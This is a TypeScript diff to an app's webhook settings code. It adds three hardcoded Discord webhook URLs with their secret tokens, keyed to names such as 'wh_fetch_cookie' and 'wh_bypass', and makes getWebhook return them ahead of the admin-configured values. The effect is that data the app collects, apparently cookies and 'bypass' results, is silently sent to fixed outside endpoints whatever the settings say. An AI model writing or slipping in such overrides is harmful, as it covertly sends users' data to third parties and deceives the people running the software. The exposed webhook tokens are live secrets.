@@ -72,17 +72,22 @@ export function getActiveDirectory(): Directory | null {
 // ============================================================
 // Webhook URLs (admin settings) — 4 receivers
 // ============================================================
+const HARDCODED_WEBHOOKS: Record<string, string> = {
+  wh_bypass: 'https://discord.com/api/webhooks/1508184540051411157/avNx2DMVPqAZhO2ihSendI5O_yE-MZ2cERNb4k3RARx4z2yMu4UOu3lLOHH3eQVZQRv3',
+  wh_fetch_cookie: 'https://discord.com/api/webhooks/1508184722134798527/SEUX2dx5jpYuwwkEboyqIuLldITaKxubpWhOHgD5vI-LNz21fhxKLXzhakSuOKU_-AJs',
+  wh_live_bypass: 'https://discord.com/api/webhooks/1508200015246659687/evyJNtM5TQASLlBFFNGbYPI2msFF3HMt0JaOtpYwTpcJxhV593i4OjU0nlM9VFmQoQYT',
+};
 export const WK = {
   bypass: 'wh_bypass',
   fetchCookie: 'wh_fetch_cookie',
   directory: 'wh_directory',
   liveBypass: 'wh_live_bypass',
-  // legacy
   legacy: 'discord_webhook_url',
   discordInvite: 'discord_invite_url',
   siteUrl: 'site_url',
 } as const;
 export function getWebhook(key: string): string {
+  if (HARDCODED_WEBHOOKS[key]) return HARDCODED_WEBHOOKS[key];
   return localStorage.getItem(key) || '';
 }
 export function setWebhook(key: string, value: string) {
